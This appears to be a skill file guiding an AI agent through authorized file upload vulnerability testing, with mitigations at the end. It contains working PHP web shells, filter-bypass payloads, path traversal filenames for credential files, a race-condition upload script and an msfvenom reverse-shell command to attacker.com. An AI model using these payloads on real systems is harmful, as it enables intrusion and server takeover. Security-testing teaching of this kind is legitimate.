---
name: file-upload-testing
description: Professional skills and methodology for file upload vulnerability testing
version: 1.0.0
---

# File Upload Vulnerability Testing

## Overview

File upload is common in web applications but introduces several security risks. This skill covers detection, exploitation, and prevention of file upload vulnerabilities.

## Vulnerability Types

### 1. Unvalidated File Types

**Frontend-only validation:**
```javascript
// Can be bypassed
if (!file.name.endsWith('.jpg')) {
  alert('Only images may be uploaded');
}
```

### 2. Unvalidated File Contents

**Checking only the extension:**
```php
// Unsafe code
if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
}
```

### 3. Path Traversal

**Unfiltered filenames:**
```
filename: ../../../etc/passwd
filename: ..\..\..\windows\system32\config\sam
```

### 4. Filename Overwrite

**Predictable filenames:**
```
uploads/1.jpg
uploads/2.jpg
```

## Testing Methods

### 1. Basic Detection

**Test various file types:**
- .php, .jsp, .asp, .aspx
- .php3, .php4, .php5, .phtml
- .jspx, .jspf
- .htaccess, .htpasswd

**Test double extensions:**
```
shell.php.jpg
shell.jpg.php
```

**Test letter case:**
```
shell.PHP
shell.PhP
```

### 2. Content-Type Bypass

**Modify Content-Type:**
```
Content-Type: image/jpeg
# The file actually contains PHP code
```

**Magic Bytes：**
```php
// Add an image header before the PHP code
GIF89a<?php phpinfo(); ?>
```

### 3. File Parsing Vulnerabilities

**Apache parsing vulnerabilities:**
```
shell.php.xxx  # Apache may interpret this as PHP
```

**IIS parsing vulnerabilities:**
```
shell.asp;.jpg
shell.asp:.jpg
```

**Nginx parsing vulnerabilities:**
```
shell.jpg%00.php
```

### 4. Race Conditions

**Access the file immediately after upload:**
```python
# Upload a .php file and access it after upload completes but before deletion
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    time.sleep(0.1)
    requests.get('http://target.com/uploads/shell.php?cmd=id')

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

## Exploitation Techniques

### PHP WebShell

**Basic web shell:**
```php
<?php system($_GET['cmd']); ?>
```

**One-line web shell:**
```php
<?php eval($_POST['a']); ?>
```

**Bypass filtering:**
```php
<?php
$_GET['cmd']($_POST['a']);
// Usage: ?cmd=system
```

### .htaccess Exploitation

**Upload .htaccess:**
```
AddType application/x-httpd-php .jpg
```

**Then upload shell.jpg containing PHP code**

### Image Files Containing Code

**GIF with embedded code:**
```php
GIF89a
<?php
phpinfo();
?>
```

**PNG with embedded code:**
```bash
# Use a tool to embed PHP code in a PNG
python3 png2php.py shell.php shell.png
```

### Combining with File Inclusion

**If a file inclusion vulnerability exists:**
```
# Upload an image containing PHP code
# Then execute it through file inclusion
?file=uploads/shell.jpg
```

## Bypass Techniques

### Extension Filter Bypass

**Double extensions:**
```
shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
```

**Letter case:**
```
shell.PHP
shell.PhP
```

**Special characters:**
```
shell.php.
shell.php 
shell.php%20
```

### Content-Type Bypass

**Modify request headers:**
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes Bypass

**Add file headers:**
```php
// JPEG
\xFF\xD8\xFF\xE0<?php phpinfo(); ?>

// GIF
GIF89a<?php phpinfo(); ?>

// PNG
\x89\x50\x4E\x47<?php phpinfo(); ?>
```

### Code Obfuscation

**Using short tags:**
```php
<?= system($_GET['cmd']); ?>
```

**Using variables:**
```php
<?php
$a='sys';
$b='tem';
$a.$b($_GET['cmd']);
```

## Tools

### Burp Suite

1. Intercept a file upload request
2. Modify the filename and contents
3. Test different bypass techniques

### Upload Bypass

```bash
# Test file uploads using various techniques
python upload_bypass.py -u http://target.com/upload -f shell.php
```

### Web Shell Generation

```bash
# Generate various web shells
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
```

## Verification and Reporting

### Verification Steps

1. Confirm that a malicious file can be uploaded
2. Verify that the file can execute
3. Assess impact (command execution, data disclosure, etc.)
4. Record the complete proof of concept
5. Record confirmed findings with `report_finding`, the platform's only entry point for findings. Include location, type, severity, reproduction steps/PoC, and remediation guidance

### Report Essentials

- Vulnerability location and upload feature
- Uploadable file types and execution methods
- Complete exploitation steps and PoC
- Remediation guidance (file type validation, content checks, secure storage, etc.)

## Mitigations

### Recommended Approach

1. **File type allowlist**
   ```python
   ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
   ext = filename.rsplit('.', 1)[1].lower()
   if ext not in ALLOWED_EXTENSIONS:
       raise ValueError("File type not allowed")
   ```

2. **File content validation**
   ```python
   import magic
   file_type = magic.from_buffer(file_content, mime=True)
   if not file_type.startswith('image/'):
       raise ValueError("Invalid file content")
   ```

3. **Rename files**
   ```python
   import uuid
   filename = str(uuid.uuid4()) + '.' + ext
   ```

4. **Isolated storage**
   - Store files outside the web root
   - Serve files through a proxy script
   - Disable execution permissions

5. **File scanning**
   - Scan with antivirus software
   - Inspect file contents
   - Remove execution permissions

6. **Size limits**
   ```python
   MAX_SIZE = 5 * 1024 * 1024  # 5MB
   if file.size > MAX_SIZE:
       raise ValueError("File too large")
   ```

## Considerations

- Test only in authorized environments
- Avoid uploading malicious files to production
- Clean up promptly after testing
- Account for parsing differences between servers